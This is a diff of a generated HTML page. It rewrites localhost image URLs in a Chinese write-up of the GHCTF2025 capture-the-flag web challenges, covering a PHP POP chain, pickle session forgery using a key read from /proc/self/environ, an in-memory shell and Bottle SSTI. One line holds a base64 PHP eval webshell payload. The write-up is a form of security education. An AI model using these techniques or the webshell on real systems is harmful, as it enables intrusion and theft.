+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250403111933763_hu16629013937075566826.png 480w, http://localhost:1313/p/ghctf2025/image-20250403111933763_hu8262287769483651399.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250403111933763&#34;
@@ -5149,10 +5149,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	接接接下来，我们找到这个类的__destruct()函数，这个函数是会自动调用的，那么至此，这条pop链就很清晰了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250403112948479.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250403112948479.png&#34;
 	width=&#34;724&#34;
 	height=&#34;580&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250403112948479_hu1174232379153608414.png 480w, http://localhost:58266/p/ghctf2025/image-20250403112948479_hu246875117026676174.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250403112948479_hu1174232379153608414.png 480w, http://localhost:1313/p/ghctf2025/image-20250403112948479_hu246875117026676174.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250403112948479&#34;
@@ -5180,10 +5180,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public $DirectoryIterator=&amp;#39;/&amp;#39;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404183529322.png&#34;
+&lt;/div&gt;&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404183529322.png&#34;
 	width=&#34;610&#34;
 	height=&#34;487&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404183529322_hu1564678781056025745.png 480w, http://localhost:58266/p/ghctf2025/image-20250404183529322_hu17108809234354909475.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404183529322_hu1564678781056025745.png 480w, http://localhost:1313/p/ghctf2025/image-20250404183529322_hu17108809234354909475.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404183529322&#34;
@@ -5195,10 +5195,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​		（其实可以少写两步，而且不用每个类都这样创建对象，附上图）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404190530962.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404190530962.png&#34;
 	width=&#34;570&#34;
 	height=&#34;131&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404190530962_hu15622309504368903127.png 480w, http://localhost:58266/p/ghctf2025/image-20250404190530962_hu2578902291082764798.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404190530962_hu15622309504368903127.png 480w, http://localhost:1313/p/ghctf2025/image-20250404190530962_hu2578902291082764798.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404190530962&#34;
@@ -5210,10 +5210,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	成功读取目录&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404183433061.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404183433061.png&#34;
 	width=&#34;1568&#34;
 	height=&#34;1030&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404183433061_hu16050908403585735217.png 480w, http://localhost:58266/p/ghctf2025/image-20250404183433061_hu17330185596862660587.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404183433061_hu16050908403585735217.png 480w, http://localhost:1313/p/ghctf2025/image-20250404183433061_hu17330185596862660587.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404183433061&#34;
@@ -5225,10 +5225,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	之后把$DirectoryIterator=&amp;rsquo;/&amp;rsquo;;换成$SplFileObject=&amp;rsquo;/flag44545615441084&#39;;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404192220834.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404192220834.png&#34;
 	width=&#34;1595&#34;
 	height=&#34;661&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404192220834_hu13025238924678762549.png 480w, http://localhost:58266/p/ghctf2025/image-20250404192220834_hu11548555411401018554.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404192220834_hu13025238924678762549.png 480w, http://localhost:1313/p/ghctf2025/image-20250404192220834_hu11548555411401018554.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404192220834&#34;
@@ -5241,10 +5241,10 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;ezzzz_pickle&#34;&gt;ezzzz_pickle
 &lt;/h3&gt;&lt;h4 id=&#34;知识点弱口令文件读取docker-entrypointshprocselfenvironpickle反序列化&#34;&gt;知识点：弱口令、文件读取（docker-entrypoint.sh、/proc/self/environ）、pickle反序列化
-&lt;/h4&gt;&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404192929353.png&#34;
+&lt;/h4&gt;&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404192929353.png&#34;
 	width=&#34;1210&#34;
 	height=&#34;993&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404192929353_hu6344947445728942219.png 480w, http://localhost:58266/p/ghctf2025/image-20250404192929353_hu9580484375191163855.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404192929353_hu6344947445728942219.png 480w, http://localhost:1313/p/ghctf2025/image-20250404192929353_hu9580484375191163855.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404192929353&#34;
@@ -5256,10 +5256,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	弱口令爆破，用户名admin，密码admin123（其实我一直觉得这里很难爆QAQ，万一字典不对&amp;hellip;&amp;hellip;）&lt;/p&gt;
-&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404193933294.png&#34;
+&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404193933294.png&#34;
 	width=&#34;614&#34;
 	height=&#34;293&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404193933294_hu11754078056090919285.png 480w, http://localhost:58266/p/ghctf2025/image-20250404193933294_hu13508138728008713247.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404193933294_hu11754078056090919285.png 480w, http://localhost:1313/p/ghctf2025/image-20250404193933294_hu13508138728008713247.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404193933294&#34;
@@ -5271,10 +5271,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	直接读取肯定是不对的，这里我们找不到其他信息就看看源代码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404194019365.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404194019365.png&#34;
 	width=&#34;771&#34;
 	height=&#34;407&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404194019365_hu3252089804305316202.png 480w, http://localhost:58266/p/ghctf2025/image-20250404194019365_hu4652221887526728992.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404194019365_hu3252089804305316202.png 480w, http://localhost:1313/p/ghctf2025/image-20250404194019365_hu4652221887526728992.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404194019365&#34;
@@ -5287,10 +5287,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​	发现有hint，session_pickle!
 ​	抓个包看看，发现文件读取漏洞&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404194547554.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404194547554.png&#34;
 	width=&#34;1809&#34;
 	height=&#34;652&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404194547554_hu17488120122261082247.png 480w, http://localhost:58266/p/ghctf2025/image-20250404194547554_hu10638572940422333764.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404194547554_hu17488120122261082247.png 480w, http://localhost:1313/p/ghctf2025/image-20250404194547554_hu10638572940422333764.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404194547554&#34;
@@ -5302,10 +5302,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	可以读文件，那么活学活用ez_readfile，读一下docker-entrypoint.sh&lt;/p&gt;
-&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404201647115.png&#34;
+&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404201647115.png&#34;
 	width=&#34;1847&#34;
 	height=&#34;976&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404201647115_hu5276306178880378717.png 480w, http://localhost:58266/p/ghctf2025/image-20250404201647115_hu18283063487665507742.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404201647115_hu5276306178880378717.png 480w, http://localhost:1313/p/ghctf2025/image-20250404201647115_hu18283063487665507742.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404201647115&#34;
@@ -5317,10 +5317,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	读到了！&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404201739929.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404201739929.png&#34;
 	width=&#34;1611&#34;
 	height=&#34;700&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404201739929_hu11606992078746918606.png 480w, http://localhost:58266/p/ghctf2025/image-20250404201739929_hu10005667383108982896.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404201739929_hu11606992078746918606.png 480w, http://localhost:1313/p/ghctf2025/image-20250404201739929_hu10005667383108982896.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404201739929&#34;
@@ -5334,10 +5334,10 @@
 &lt;p&gt;​	真要活学活用啊！&lt;/p&gt;
 &lt;p&gt;​	这里还是写一下预期解。&lt;/p&gt;
 &lt;p&gt;​	读个源码看看（python默认/app/app.py），这里可以过Wappalyzer知道是什么代码写的网页（如果是php的话，那就是/var/www/html/index.php）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404195640041.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404195640041.png&#34;
 	width=&#34;1020&#34;
 	height=&#34;984&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404195640041_hu7808470026173128188.png 480w, http://localhost:58266/p/ghctf2025/image-20250404195640041_hu12941458054171166754.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404195640041_hu7808470026173128188.png 480w, http://localhost:1313/p/ghctf2025/image-20250404195640041_hu12941458054171166754.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404195640041&#34;
@@ -5348,10 +5348,10 @@
 		data-flex-basis=&#34;248px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404195355703.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404195355703.png&#34;
 	width=&#34;1837&#34;
 	height=&#34;1103&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404195355703_hu1990875227309412435.png 480w, http://localhost:58266/p/ghctf2025/image-20250404195355703_hu119216727857601130.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404195355703_hu1990875227309412435.png 480w, http://localhost:1313/p/ghctf2025/image-20250404195355703_hu119216727857601130.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404195355703&#34;
@@ -5597,10 +5597,10 @@
 &lt;/div&gt;&lt;p&gt;​	审计代码用一下官方wp的话，&lt;/p&gt;
 &lt;p&gt;​	通过源码可以发现其session是通过&lt;strong&gt;pickle 序列化字典&lt;/strong&gt;然后&lt;strong&gt;base64编码&lt;/strong&gt;再&lt;strong&gt;AES加密&lt;/strong&gt;在编码的结果，验证⽤户时session解码的过程也是base64解码AES解码base64解码pickle反序列化。那么我们只要能够&lt;strong&gt;获得这个加解密的key和iv就可以伪造出session&lt;/strong&gt;从⽽控制pickle反序列化的内容，进⾏命令执⾏。&lt;/p&gt;
 &lt;p&gt;​	我们从下面这段代码可知，key和iv都是可以通过环境变量读的，可以通过/proc/self/environ（与语言无关）来读&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404220701516.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404220701516.png&#34;
 	width=&#34;705&#34;
 	height=&#34;190&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404220701516_hu3884489587760191844.png 480w, http://localhost:58266/p/ghctf2025/image-20250404220701516_hu15787925879933113957.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404220701516_hu3884489587760191844.png 480w, http://localhost:1313/p/ghctf2025/image-20250404220701516_hu15787925879933113957.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404220701516&#34;
@@ -5611,10 +5611,10 @@
 		data-flex-basis=&#34;890px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404233144386.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404233144386.png&#34;
 	width=&#34;1893&#34;
 	height=&#34;671&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404233144386_hu7371813574626794233.png 480w, http://localhost:58266/p/ghctf2025/image-20250404233144386_hu9006414988986071837.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404233144386_hu7371813574626794233.png 480w, http://localhost:1313/p/ghctf2025/image-20250404233144386_hu9006414988986071837.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250404233144386&#34;
@@ -5725,10 +5725,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;然后根据内存马逻辑，需要去一个会报404的路由然后get传shell进行命令执行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250404233340505.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250404233340505.png&#34;
 	width=&#34;1121&#34;
 	height=&#34;179&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250404233340505_hu10201354248893349276.png 480w, http://localhost:58266/p/ghctf2025/image-20250404233340505_hu4230481106729769591.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250404233340505_hu10201354248893349276.png 480w, http://localhost:1313/p/ghctf2025/image-20250404233340505_hu4230481106729769591.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -5743,10 +5743,10 @@
 &lt;h3 id=&#34;escape&#34;&gt;Escape！
 &lt;/h3&gt;&lt;h4 id=&#34;知识点字符串逃逸代码审计&#34;&gt;知识点：字符串逃逸，代码审计
 &lt;/h4&gt;&lt;p&gt;Seay读一下源码，发现有个需要绕过exit的可命令执行的地方&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250504184851801.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250504184851801.png&#34;
 	width=&#34;1868&#34;
 	height=&#34;995&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250504184851801_hu6700910793411732733.png 480w, http://localhost:58266/p/ghctf2025/image-20250504184851801_hu16050701925155122772.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250504184851801_hu6700910793411732733.png 480w, http://localhost:1313/p/ghctf2025/image-20250504184851801_hu16050701925155122772.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250504184851801&#34;
@@ -5758,10 +5758,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;但是写入文件需要admin权限，我们看一下身份验证逻辑&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250504190749758.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250504190749758.png&#34;
 	width=&#34;1544&#34;
 	height=&#34;689&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250504190749758_hu16311892099262304402.png 480w, http://localhost:58266/p/ghctf2025/image-20250504190749758_hu18190883085617239838.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250504190749758_hu16311892099262304402.png 480w, http://localhost:1313/p/ghctf2025/image-20250504190749758_hu18190883085617239838.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -5772,10 +5772,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;先是session解密，将解密内容进⾏反序列话，然后调⽤反序列化实例的isadmin⽅法。&lt;/p&gt;
 &lt;p&gt;但是我们没有密钥，不能伪造session，我们就看看登录逻辑&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250504191518612.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250504191518612.png&#34;
 	width=&#34;1242&#34;
 	height=&#34;477&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250504191518612_hu1530287657117669665.png 480w, http://localhost:58266/p/ghctf2025/image-20250504191518612_hu1935962370150801001.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250504191518612_hu1530287657117669665.png 480w, http://localhost:1313/p/ghctf2025/image-20250504191518612_hu1935962370150801001.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250504191518612&#34;
@@ -5786,10 +5786,10 @@
 		data-flex-basis=&#34;624px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250504191159098.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250504191159098.png&#34;
 	width=&#34;1288&#34;
 	height=&#34;517&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250504191159098_hu17901449833033795382.png 480w, http://localhost:58266/p/ghctf2025/image-20250504191159098_hu9340674099354534877.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250504191159098_hu17901449833033795382.png 480w, http://localhost:1313/p/ghctf2025/image-20250504191159098_hu9340674099354534877.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250504191159098&#34;
@@ -5802,10 +5802,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;发现login返回一个user类，然后把这个类序列化后送去waf检测，检测之后然后，送去加密。&lt;/p&gt;
 &lt;p&gt;最后看看waf&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250504192127126.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250504192127126.png&#34;
 	width=&#34;1025&#34;
 	height=&#34;320&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250504192127126_hu2743486374064005972.png 480w, http://localhost:58266/p/ghctf2025/image-20250504192127126_hu16617382662432648568.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250504192127126_hu2743486374064005972.png 480w, http://localhost:1313/p/ghctf2025/image-20250504192127126_hu16617382662432648568.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250504192127126&#34;
@@ -5870,10 +5870,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250505141156178.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250505141156178.png&#34;
 	width=&#34;2023&#34;
 	height=&#34;250&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250505141156178_hu11357435899041173148.png 480w, http://localhost:58266/p/ghctf2025/image-20250505141156178_hu2212187276372435667.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250505141156178_hu11357435899041173148.png 480w, http://localhost:1313/p/ghctf2025/image-20250505141156178_hu2212187276372435667.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250505141156178&#34;
@@ -5885,10 +5885,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;但是需要加一个字母在前面，不然不会进行解码，关于原因，大概是以下两点&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250505141526525.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250505141526525.png&#34;
 	width=&#34;1346&#34;
 	height=&#34;801&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250505141526525_hu13627654099853675341.png 480w, http://localhost:58266/p/ghctf2025/image-20250505141526525_hu11047769414459735591.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250505141526525_hu13627654099853675341.png 480w, http://localhost:1313/p/ghctf2025/image-20250505141526525_hu11047769414459735591.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250505141526525&#34;
@@ -5903,10 +5903,10 @@
 &lt;h3 id=&#34;message-in-a-bottle&#34;&gt;Message in a Bottle
 &lt;/h3&gt;&lt;h4 id=&#34;知识点代码审计bottle框架ssti&#34;&gt;知识点：代码审计，bottle框架ssti
 &lt;/h4&gt;&lt;p&gt;页面是个留言板，感觉像xss？有源码审计一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250505154750878.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250505154750878.png&#34;
 	width=&#34;908&#34;
 	height=&#34;883&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250505154750878_hu7190154164758880073.png 480w, http://localhost:58266/p/ghctf2025/image-20250505154750878_hu12486599197016427048.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250505154750878_hu7190154164758880073.png 480w, http://localhost:1313/p/ghctf2025/image-20250505154750878_hu12486599197016427048.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250505154750878&#34;
@@ -5918,10 +5918,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;可以发现，有template，模板渲染，是ssti的漏洞，然后waf过滤了&amp;rsquo;{&amp;rsquo;   &amp;lsquo;}&amp;rsquo;，根据bottle框架的官方文档里可以发现&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250505161655063.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250505161655063.png&#34;
 	width=&#34;1143&#34;
 	height=&#34;747&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250505161655063_hu1805640909347692963.png 480w, http://localhost:58266/p/ghctf2025/image-20250505161655063_hu2774819704577896093.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250505161655063_hu1805640909347692963.png 480w, http://localhost:1313/p/ghctf2025/image-20250505161655063_hu2774819704577896093.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250505161655063&#34;
@@ -5932,10 +5932,10 @@
 		data-flex-basis=&#34;367px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250505162116729.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250505162116729.png&#34;
 	width=&#34;1009&#34;
 	height=&#34;753&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250505162116729_hu10456167780144996326.png 480w, http://localhost:58266/p/ghctf2025/image-20250505162116729_hu14143636203745206744.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250505162116729_hu10456167780144996326.png 480w, http://localhost:1313/p/ghctf2025/image-20250505162116729_hu14143636203745206744.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250505162116729&#34;
